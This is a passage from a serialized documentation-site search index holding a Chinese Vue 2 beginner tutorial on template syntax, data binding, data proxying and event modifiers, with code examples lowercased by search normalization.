}\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 自定义指令语法：\n    1. 局部指令：new Vue({directives: xxx(){}})或new Vue({directives: {xxx:{bind(){},inserted(){},update(){}}}})\n    2. 全局指令：Vue.directive(\'xxx\', function(element, binding){})或Vue.directive(\'xxx\', {bind(){},inserted(){},update(){}})\n 2. 自定义指令的配置对象里常用的3个回调：\n    1. bind，自定义指令与虚拟元素成功绑定时bind被调用\n    2. inserted，自定义指令所在真实元素被插入到页面时inserted被调用\n    3. update，自定义指令在模板被重新解析时update被调用\n 3. 备注：\n    1. 自定义指令在定义时不要加v-，但要在使用时加上v-；\n    2. 自定义指令如果是多个单词组成的，要使用短横线-进行分隔，对应方法名使用字符串形式。\n\n----------------------------------------',normalizedContent:'# vue基础\n\n\n# 一、vue基本用法\n\n\n# 1.1 初识vue\n\n初学者不建议刚开始就用脚手架，我们先从普通html开始。在<head>里使用<script src="xxx">方式引入vue库，并修改productiontip配置项，用于关闭浏览器devtools里vue的“请使用生产版本”提示信息。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    \x3c!-- 引入vue --\x3e\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <script type="text/javascript">\n        // 阻止 vue 在启动时生成生产提示。\n        vue.config.productiontip = false;\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n引入vue库之后想要具体使用它，先准备一个div容器，并给它一个id属性（也可以class）；然后在<script>里new一个vue实例，并传入配置对象。配置对象中的el，是用来关联之前准备好的div容器（将vue实例挂载到根节点上），其值一般是#root这种css选择器字符串形式，也可以直接找到那个容器el: document.getelementbyid(\'root\')。配置对象中的data，是vue实例的存储数据，可供关联容器使用，其值可以是对象（在组件里是函数，该函数再返回对象）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    \x3c!-- 准备一个容器。使用id选择器，也可以是class选择器 --\x3e\n    <div id="root">\n        \x3c!-- {{}}是插值形式，属于模板语法。它可以使用vue实例存储的数据 --\x3e\n        <h1>hello {{name}}</h1>\n    </div>\n    <script type="text/javascript">\n        // 阻止 vue 在启动时生成生产提示。\n        vue.config.productiontip = false;\n        // 对vue进行实例化\n        const vm = new vue({\n            el: \'#root\',    // el用于指定当前vue实例为哪个容器服务，值通常为css选择器字符串\n            data: {         // data用于存储数据，数据供el所指定容器去使用，值暂时为一个对象\n                name: \'张三\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n一个容器是否能关联多个vue实例？一个vue实例是否能关联多个容器？答案是都不可以，容器和vue实例是一一对应的，不存在一对多或者多对一的关系。比如下面的写法是不规范的；如果写多个class形式的root容器，用一个vue实例关联他们，结果是只有第一个root容器会正确渲染，代码就不演示了。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>hello {{name}}</h1>\x3c!-- name显示的是张三 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        new vue({\n            el: \'#root\',\n            data: { name: \'张三\' }\n        });\n        // 不规范，也不会对那个root容器产生影响\n        new vue({\n            el: \'#root\',\n            data: { name: \'李四\' }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 想让vue工作，就必须创建一个vue实例，且要传入一个配置对象；\n 2. root容器里的代码依然符合html规范，只不过混入了一些特殊的vue语法（模板语法）；\n 3. vue实例和容器是一一对应的；真实开发中只有一份vue实例（和一个根节点），并且会配合着组件一起使用；\n\n----------------------------------------\n\n\n# 1.2 模板语法\n\n模板语法是一种基于html的语法，它可以在模板里使用vue实例存储的数据。模板语法有插值和指令两类。\n\n其中插值是为了参与标签体内容的展示。插值使用两个花括号将一个js表达式括起来的，例如{{xxx}}，其中的xxx就是js表达式。\n\n * 那还得区分“js表达式”和“js语句”：\n   * js表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，例如a（变量）、a+b、demo(1)、x === y ? \'a\' : \'b\'。\n   * js语句：基本语法组成的语句，还有完整的赋值、运算语句等，例如if(){}、for(){}、var a = 1。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- {{}}里使用js表达式，不能写if语句不能写for语句等 --\x3e\n        <h1>hello {{name}} - {{11+22}} - {{date.now()}}</h1>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n指令是vue提供的一些特殊attribute，每个指令的功能和作用点有些不一样（不止作用在标签内容体，要比插值作用范围广）。指令的前缀是v-，其值一般期望为js表达式（v-on、v-for会特殊些），当值改变时，会动态作用于相关的dom。\n\n下面就是一个使用v-bind指令例子，用于给标签属性绑定值（其他指令并不一定作用于标签属性），v-bind也能作用于自定义属性。有些指令是可以进行简写的，v-bind:可以简写为:，还有v-on:可简写为@，像v-if和v-for就不可以简写。注意不要将{{}}写在标签属性里，会报错，插值是用在标签体的。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>插值语法</h1>\n        <h1>hello {{name}}</h1>\n        <h1>指令语法</h1>\n        \x3c!-- 指令的值是个表达式，url的值是\'www.baidu.com\'，最后href就是这个字符串 --\x3e\n        <a v-bind:href="url">{{name}}，请看这里</a><br>\n        \x3c!-- v-bind:可以简写为: --\x3e\n        <a :href="url">{{name}}，请看这里</a><br>\n        \x3c!-- 可以绑定其他属性，包括自定义属性 --\x3e\n        <a :x="msg">{{name}}，请看这里</a>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                url: \'www.baidu.com\',\n                msg: \'xxxxx\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n前面使用的{{name}}和:href="url"，一直没有解释为什么能直接使用name和url，这其中咋没出现vm和data呢？没有出现vm的原因是，模板语法可以直接访问vm的所有属性（无需vm.xxx）。没有出现data的原因有两个，这会在2.2 vue的数据代理里解释。反正记住模板语法里可以直接写原配置对象里data的所有属性。\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插值语法：\n    功能：用于解析标签体内容（标签闭合的内容）。\n    写法：{{xxx}}，xxx是js表达式。\n 2. 指令语法：\n    功能：用于解析标签（包扩：标签属性、标签体内容、绑定事件...）。\n    举例：v-bind:href="xxx"或简写为:href="xxx"，xxx是js表达式。\n    备注：这里是拿v-bind作为例子，vue还是其他常用的指令，可作用于标签体内容等，但值也不一定就是js表达式。\n 3. 模板语法里不要出现vm和data的字样，可直接写原配置对象里data的所有属性。\n\n----------------------------------------\n\n\n# 1.3 单向和双向数据绑定\n\n前面我们使用过v-bind对标签属性进行了数据绑定，可以直接读取到data中的所有属性（{{}}也可以），并且一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新。我们用以下代码并配合使用vue devtools对data数据进行修改，页面里使用到对应data数据的地方都会重新渲染。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-bind是单向的，{{}}也是单向的，数据控制着页面展示 --\x3e\n        单向数据绑定1：<a v-bind:href="url">hello, {{name}}</a><br>\n        单向数据绑定2：<input type="text" v-bind:value="text">\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                url: \'www.baidu.com\',\n                text: \'你好呀！\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n\n你会发现从“数据”到“页面”这是一种单方向的控制，反过来就不行了。在上面例子输入框里输入新的值，你会发现虽然输入框内容展示变了，但vue devtools的data里的text不会跟着变，可以看下面的效果图。我们将使用v-bind以达到“存储数据”单向控制“页面展示”的方式称为单向数据绑定（{{}}也是单向的）。\n\n\n\n要想让输入框内容的改变影响到data里的text（也就是“页面”也能控制“存储数据”），是可以使用v-model的双向数据绑定，代码如下。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        单向数据绑定：<input type="text" v-bind:value="textone"><br>\n        双向数据绑定：<input type="text" v-model:value="texttwo">\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        new vue({\n            el: \'#root\',\n            data: {\n                textone: \'你好呀！\',\n                texttwo: \'我不好！\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n\nv-model一般用在输入类或者说表单类元素里，因为表单类元素有“用户操作”的点。其他普通元素没有“用户操作”的地方，而且也不需要让普通元素来影响到data数据。\n\n一般来说，v-model绑定的是表单类元素的value属性，这样的情况是可以简写的，例如v-model:value简写为v-model="xxx"。如果绑定的属性不是value属性，就不要进行简写了。还有就是，如果你强行使用v-model到非表单类元素里，vue会在控制台里发出错误提示。\n\n\x3c!-- v-model是作用在表单元素的value上，所以连带value字段也隐藏了 --\x3e\n<input type="text" v-model:value="text">\n<input type="text" v-model="text">\n\n\n1\n2\n3\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 单向数据绑定(v-bind)：数据只能从data流向页面。\n 2. 双向数据绑定(v-model)：数据不仅能从data流向页面，也能从页面流向data。\n 3. 双向数据绑定一般应用在表单类元素上（如：<input>、<select>等）。\n 4. v-model:value可以简写为v-model，因为v-model一般默认收集的就是value值。\n\n----------------------------------------\n\n\n# 二、vue的mvvm和数据代理\n\n\n# 2.1 vue的mvvm\n\n> 虽然没有完全遵循 mvvm 模型，但是 vue 的设计也受到了它的启发。——vue官网\n\n 1. m：模型（model），对应data中的数据，开发人员编写的js对象等原始数据。\n 2. v：视图（view），模板，其实最后都是页面上dom。\n 3. vm：视图模型（viewmodel），vue实例对象，它提供了很多功能，比如数据绑定和dom监听。\n\n\n\n最难理解的就是vm，它代表就是vue框架，给开发人员提供很多有用的属性和方法。把vue框架引入我们自己的项目并将其实例化（具体化），那得到就是常命名为vm的vue实例了，如下图。\n\n\n\n在1.2 模板语法里说过“模板语法可以直接访问vm的所有属性”（这是vue规定的），所有属性包括内部属性以及原型上的属性，这是vue框架给开发人员提供使用的一部分能力，另一部分是可以在js代码里使用vue自带的方法（框架提供的方法，例如$mount是另一种挂载方式）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 这个是data数据 --\x3e\n        <h1>hello {{name}}</h1>\n        \x3c!-- 这个是内部属性 --\x3e\n        <h1>_c：{{_c}}</h1>\n        \x3c!-- 这个是原型上的 --\x3e\n        <h1>$destroy：{{$destroy}}</h1>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { name: \'张三\' }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n\n上图的vm里除了有自身的属性，也出现了data里的所有属性，这会在接下来的2.2 vue的数据代理里进行解释。\n\n----------------------------------------\n\n总结拓展：\n\n 1. m模型（modle），data中的数据；v视图（view），模板代码；vm视图模型（viewmodel），vue实例。\n 2. vm身上的所有属性及vue原型上的所有属性，在vue模板中都可以直接使用。\n 3. data中所有的属性，最后都出现在了vm身上。\n\n----------------------------------------\n\n\n# 2.2 vue的数据代理\n\n数据代理是指通过一个对象代理对另一个对象中属性的操作（读/写），在使用的时候我们只接触到了表面的那个对象，而另外一个对象会隐藏在暗处。\n\n要搞清楚数据代理，首先得了解数据属性、访问器属性、object.defineproperty()方法。\n\n数据属性有四个特性，[[configurable]]可配置的，[[enumerable]]可枚举的，[[writable]]可重写的，[[value]]属性值。访问器属性也有四个特性，[[configurable]]可配置的、[[enumerable]]可枚举的、[[get]]和[[set]]（我们常说的getter和setter）。\n\n使用属性的基本特性并搭配object.defineproperty()可以实现简单的数据代理。\n\n// 通obj2去代理obj1的x属性\nlet obj1 = { x: 200 };\nlet obj2 = { x: 300 };\nobject.defineproperty(obj2, \'x\', {\n    get() {\n        return obj1.x;\n    },\n    set(value) {\n        obj1.x = value;\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n我们先不着急说vue中的数据代理，我们先想一下配置对象的data存到哪里去了。在实例化vue时，vue()构造函数会处理配置对象，将其中的data数据存到vue实例的_data（也就是vm._data）。可以看下面简化的vue源码（在源码里搜function vue），具体到下面代码的到initdata(vm)里会有对上面“将其中的data数据存到vue实例的_data”的印证。\n\n// 无关紧要的都删掉不看了\nfunction vue(options) {\n    // vm会是以后的vue实例，options就是配置对象\n    var vm = this;\n    // 将options合并后到vm.$options，暂不用管mergeoptions和xxx是什么\n    vm.$options = mergeoptions(xxx, options || {}, vm);\n    // 数据处理相关\n    initstate(vm);\n}\nfunction initstate(vm) {\n    initdata(vm);\n}\n// 重点来了，将配置对象的data存储数据都给了vm._data\nfunction initdata(vm) {\n    var data = vm.$options.data;\n    data = vm._data = typeof data === \'function\' ? getdata(data, vm) : data || {};\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n我们知道了数据最终会存到vm._data里，那为什么插值和指令在访问数据时反而没有用到_data呢？原因是vue做了数据代理，让vm代理vm._data里的所有属性，达到了上一小节末尾所说的“data中所有的属性最后都出现在了vm身上”。减少了一层_data的访问，方便了开发人员在模板中更简便地使用存储数据。\n\n我们可以接着上面的简化源代码，继续看是怎样让vm代理vm._data的。\n\n// 无关紧要的都删掉不看了\nfunction initdata(vm) {\n    var data = vm.$options.data;\n    // 将配置对象的data存储数据都给了vm._data\n    data = vm._data = typeof data === \'function\' ? getdata(data, vm) : data || {};\n    // 遍历对象所有的属性key\n    var keys = object.keys(data);\n    var i = keys.length;\n    // 代理所有的属性\n    while (i--) {\n        var key = keys[i];\n        proxy(vm, "_data", key);\n    }\n}\n// 访问器属性的四个特性\nvar sharedpropertydefinition = {\n    enumerable: true,\n    configurable: true,\n    get: function(a, b, c) { },\n    set: function(a, b, c) { }\n};\n/**\n * 重点来了，使用object.defineproperty将vm._data的所有属性都加到vm上了\n * 读取的时候，实际读的是vm._data.xxx\n * 修改的时候，实际改的是vm._data.xxx\n*/\nfunction proxy(target, sourcekey, key) {\n    // getter\n    sharedpropertydefinition.get = function proxygetter() {\n        return this[sourcekey][key]\n    };\n    // setter\n    sharedpropertydefinition.set = function proxysetter(val) {\n        this[sourcekey][key] = val;\n    };\n    // 添加key，并设置特性\n    object.defineproperty(target, key, sharedpropertydefinition);\n}\n// 这只是讲了数据代理，至于数据劫持，在[七、vue的数据监视](#七vue的数据监视)里会将\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n1.2 模板语法的末尾“没有出现data”的两个原因，就是这一小节讲的：1) data会存到vm._data；2) 模板语法里要去掉_data这一层访问。\n\n----------------------------------------\n\n总结拓展：\n\n 1. vue实例化时，配置对象中的data最终会存储到vm._data里。\n 2. vue中的数据代理：通过vm来代理vm._data中属性的操作（读/写）。\n 3. vue中数据代理的好处：在模板中更加方便的读写_data中的数据。\n 4. 基本原理：\n    1. 通过object.defineproperty()把vm._data中所有的属性添加到vm上；\n    2. 为每一个添加到vm上的属性，都指定一个getter/setter；\n    3. 在getter/setter内部去操作（读/写）vm._data中对应的属性。\n\n----------------------------------------\n\n\n# 三、在vue中处理事件\n\n\n# 3.1 事件处理\n\n要给元素绑定事件，需要用到vue的v-on指令。其值通常是事件回调函数，值还可以是一些简单语句（例如改变状态xxx = !xxx）。那这个回调函数定义在哪呢？当然还是vue的配置对象里，具体在methods里（methods、el和data平级）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-on用于绑定事件 --\x3e\n        <button v-on:click="showinfo">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo() {\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n要注意的几点：\n\n 1. v-on:是可以简写为@的（例如v-on:click简写为@click）；\n 2. methods里的方法最好不要写成箭头函数（写成普通函数），因为箭头函数没有自己的this，那实际this的指向可能不是我们需要的。\n 3. 回调函数有个默认参数是event，是常用的事件对象。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-on可以简写为@ --\x3e\n        <button @click="showinfo">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                // showinfo最好写成普通函数，this指向vm\n                showinfo(e) {\n                    // e是点击事件对象\n                    console.log(\'e\', e);\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n实际开发中，事件回调函数是需要接受类似index的参数，那么写成@click="showinfo(66)"吗？这样是不行的，这样会丢失event事件对象，vue为我们处理了这个问题，它使用$event给事件对象占位，这样就不会丢失了。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- $event为事件对象；也可以showinfo($event, 66) --\x3e\n        <button @click="showinfo(66, $event)">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo(index, e) {\n                    console.log(\'e\', e);\n                    alert(\'提示！！！\' + index);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n你可能会想到把methods里的方法移到data里，可以但没必要。因为data里的是存储数据，存储数据的变动会影响到页面的渲染，而methods里的方法大多是事件的回调函数（不是什么要紧数据），函数对象的变化基本不会对页面渲染产生影响，所以移到data是没有必要的。\n\n可以看到前面例子里@click="showinfo"，都是直接调用showinfo，并没有经过一层methods或_methods。是的，vue()构造函数里处理了这件事，先是使用bind()生成了新方法（并改了this为vm），最后把这些新方法放到了vm上。这样少了一层methods或_methods访问，方便开发人书写。vue()构造函数中与methods相关的简化源代码如下。\n\n// 无关紧要的都删掉不看了\nfunction vue(options) {\n    // vm会是以后的vue实例，options就是配置对象\n    var vm = this;\n    // 将options合并后到vm.$options，暂不用管mergeoptions和xxx是什么\n    vm.$options = mergeoptions(xxx, options || {}, vm);\n    // 数据处理相关\n    initstate(vm);\n}\nfunction initstate(vm) {\n    // 这是这一节的重点\n    initmethods(vm, vm.$options.methods);\n    // 这是 2.2 vue的数据代理 那节的重点，这里忽略\n    initdata(vm);\n}\n/**\n * 重点来了，使用bind生成了同methods[key]一样的方法，并将vm作为新方法的this\n * 最后就是将新方法放到了vm里同属性key里\n*/\nfunction initmethods(vm, methods) {\n    for (var key in methods) {\n        // noop就别管了，使用bind是重点，为啥不直接给vm，而是新生成一个函数，可能是考虑到闭包问题\n        vm[key] = typeof methods[key] !== \'function\' ? noop : bind(methods[key], vm);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n那data存储数据咋不也直接给到vm？咋还要经过_data这个对象呀？其实前面就说过data与methods不一样，methods里的只是方法，没有复杂的变化，直接给vm就行了（vue框架内部并不会用到methods）。而data里的是数据，经常变动还涉及到页面重新渲染，再说，多加一个_data也方便内部框架使用，web开发人员相当于是外部使用，两者分开来更加科学。\n\n----------------------------------------\n\n总结拓展：\n\n 1. 使用v-on:xxx="" 或 @xxx=""绑定事件，其中xxx是事件名；\n 2. 事件的回调需要配置在methods对象中，最终会在vm上；\n 3. methods中配置的函数，最好不要使用箭头函数！否则this就不是vm了；\n 4. methods中配置的函数，都是被vue所管理的函数，this的指向是vm或组件实例对象；\n 5. @click="demo"和@click="demo($event)"效果一致，但后者可以传参。\n 6. methods并不像data还有数据代理，它是直接给vm的，并没有_methods的中间层。\n\n----------------------------------------\n\n\n# 3.2 事件修饰符\n\n在开发过程中经常遇到event.preventdefault()或event.stoppropagation()等需求，vue给我们提供事件修饰符来简化写法（将回调函数中处理dom的步骤抽离出来）。事件修饰符常使用@click.xxx=""的写法，其中.xxx就是事件修饰符，事件修饰符有.prevent、.stop、.once、.capture、.self、.passive，前三个会比较常见。\n\n * .prevent是用于阻止元素的默认行为，比如<a>标签的默认行为是跳转页面，点击<a>要弹出提示框但是不让跳转页面，就可以使用@click.prevent=""，功能同回调函数里的event.preventdefault()一样。\n * .stop是用于阻止事件冒泡，比如多层<div>嵌套，但我只让最里层的<div>的事件触发，让外层<div>都不触发事件，就可以使用@click.stop=""，功能同回调函数里的event.stoppropagation()一样。\n * .once最简单，让元素只进行一次事件触发。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        * { margin: 20px 10px; }\n        /*display: flow-root会创建无副作用的bfc*/\n        .outer {\n            display: flow-root;\n            width: 200px;\n            height: 100px;\n            background-color: green;\n        }\n        .inner {\n            width: 150px;\n            height: 40px;\n            margin: 10px 20px;\n            background-color: brown;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- .prevent阻止默认事件 --\x3e\n        <a @click.prevent="showinfo" href="">点击我提示信息</a>\n        \x3c!-- .stop阻止事件冒泡，inner区域触发得了事件，并阻止click事件传到outer区域 --\x3e\n        <div class="outer" @click="showinfo">outer\n            <div class="inner" @click.stop="showinfo">inner，点击我</div>\n        </div>\n        \x3c!-- .once让事件只触发一次 --\x3e\n        <div class="inner" @click.once="showinfo">只能点击我提示一次信息哦</div>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo() {\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n.capture、.self、.passive不太常用。\n\n * .capture是使用事件的捕获模式。嵌套元素（例如多层<div>嵌套）上有点击事件时，是从最外层向最里层逐层检测并捕获到事件的（捕获阶段），然后由捕获到事件所在元素由里向外逐层调用回调函数的（冒泡阶段），那.capture使用捕获模式会在捕获阶段就调用回调函数。\n * .self表示只有当event.target是当前操作的元素时才触发事件。如果嵌套元素点击最里层元素，向外冒泡阶段时，event.target会一直是最里层那个元素，外层元素使用了.self就会取消自身的事件触发（相当于阻止了冒泡）。\n * .passive让事件的默认行为立即执行，无需等待事件回调执行完毕。有些事件是在事件回调函数执行完毕才让元素的默认行为执行，例如wheel鼠标滚轮滚动事件，如果回调函数处理很慢很慢，那鼠标滚动效果在页面上就会卡顿，这就可以使用@wheel.passive="xxx"来解决问题。其实有些事件本身就是默认行为先执行，可就用不到.passive了，其实.passive在移动端会用的多点。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        * { margin: 20px 10px; }\n        /*display: flow-root会创建无副作用的bfc*/\n        .outer {\n            display: flow-root;\n            width: 200px;\n            height: 100px;\n            background-color: green;\n        }\n        .inner {\n            width: 150px;\n            height: 40px;\n            margin: 10px 20px;\n            background-color: brown;\n        }\n        .ul {\n            width: 200px;\n            height: 150px;\n            overflow: auto;\n            background-color: orangered;\n        }\n        li { height: 70px; }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- .capture使用事件捕获模式，并且是加在外层容器上 --\x3e\n        \x3c!-- 正常情况是冒泡阶段处理事件，先提示2再提示1；如果是捕获阶段处理，则先提示1再提示2 --\x3e\n        <div class="outer" @click.capture="showinfo($event, 1)">outer，点击我提示1\n            <div class="inner" @click="showinfo($event, 2)">inner，点击我提示2</div>\n        </div>\n        \x3c!-- .self，只有event.target是当前操作的元素时才触发事件 --\x3e\n        \x3c!-- 点击inner，event.target会一直是inner，冒泡到outer，发现target与当前元素不一样，所以outer不会触发click --\x3e\n        <div class="outer" @click.self="showinfo">outer\n            <div class="inner" @click="showinfo">inner，点击我提示</div>\n        </div>\n        \x3c!-- .passive，事件的默认行为立即执行，无需等待事件回调执行完毕 --\x3e\n        \x3c!-- 使用鼠标滚轮，由于.passive会让页面效果先出现再去调用demo函数 --\x3e\n        <ul class="ul" @wheel.passive="demo">\n            <li>1</li>\n            <li>2</li>\n            <li>3</li>\n            <li>4</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo(e, msg) {\n                    const str = msg ? msg : \'\';\n                    alert(\'提示\' + str);\n                },\n                demo() {\n                    for (let i = 0; i < 20000; i++) {\n                        console.log(i);\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n事件修饰符能连用，比如一个<a>标签有href属性，并且<a>标签还在一个<div>内部，要阻止事件冒泡还要阻止默认行为，那代码可以这样写：\n\n<div class="outer" @click="showinfo">\n    \x3c!-- 也可以@click.prevent.stop，效果虽然一样，但运行还是有先后的 --\x3e\n    <a href="www.baidu.com" @click.stop.prevent="showinfo">请点击我</a>\n</div>\n\n\n1\n2\n3\n4\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. prevent，阻止默认事件（常用）；\n 2. 